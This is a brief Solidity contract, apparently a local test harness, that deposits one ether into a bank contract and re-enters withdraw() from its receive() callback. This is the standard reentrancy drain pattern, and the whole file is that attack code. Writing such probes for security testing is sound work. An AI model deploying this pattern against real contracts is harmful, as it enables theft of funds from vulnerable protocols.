// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Local-test probe that attempts a second withdrawal in its receive callback.
contract ReentrancyProbe {
    IBank public immutable bank;
    uint256 public callbacks;

    constructor(IBank bank_) {
        bank = bank_;
    }

    function run() external payable {
        require(msg.value == 1 ether, "seed one ether");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        callbacks++;
        if (address(bank).balance >= 1 ether) {
            try bank.withdraw() {} catch {}
        }
    }
}
